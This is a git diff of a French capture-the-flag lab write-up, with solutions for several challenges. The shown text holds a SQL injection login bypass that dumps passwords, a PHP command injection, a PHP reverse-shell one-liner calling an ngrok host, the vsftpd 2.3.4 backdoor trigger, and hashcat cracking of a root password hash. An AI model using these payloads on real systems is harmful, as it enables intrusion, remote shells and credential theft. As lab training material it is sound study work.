@@ -25,6 +25,7 @@ SELECT * FROM data.users WHERE username = "a" AND password="" UNION SELECT 1,pas
 * Solution :
 
     Mettre en user : (n'importe quoi)
+
     Mettre en mdp : " UNION SELECT 1,password as username,2 FROM data.users WHERE username!="admin
 
 # RCE PHP - Ping
@@ -35,8 +36,11 @@ SELECT * FROM data.users WHERE username = "a" AND password="" UNION SELECT 1,pas
     ;whoami
 
 reverse shell : https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
 nc -l -p 12345 
+
 ngrok tcp 12345
+
 php -r '$sock=fsockopen("2.tcp.ngrok.io",15705);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 upgrade : 
@@ -47,6 +51,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")';
 * Solution :
 
     ftp 10.1.0.188
+
     Connected to 10.1.0.188.
     220 (vsFTPd 2.3.4)
     Name (10.1.0.188:root): ANYTHINGHERE:)
@@ -55,11 +60,16 @@ python3 -c 'import pty;pty.spawn("/bin/bash")';
     ^C
     421 Service not available, remote server has closed connection
 
+
     nc -vn 10.1.0.188 6200
+
     Connection to 10.1.0.188 6200 port \[tcp/*\] succeeded!
 
+
     ls ~
+
     flag.txt
+
 
     cat ~/flag.txt
 
@@ -76,13 +86,17 @@ User www-data may run the following commands on machine1:
 
 # Hash root
 ls ~
+
 pense_bete.txt
 
 cat ~/pense_bete.txt
+
 Pense-bête pour le mdp root de l'autre machine:
+
 dc15d3f5ab9656bc55f7a2f5d1e3a0a5
 
 * Solution :
 
     hashcat -m0 -O flag /usr/share/wordlists/rockyou.txt
+
     (hashcat -m0 --show flag)
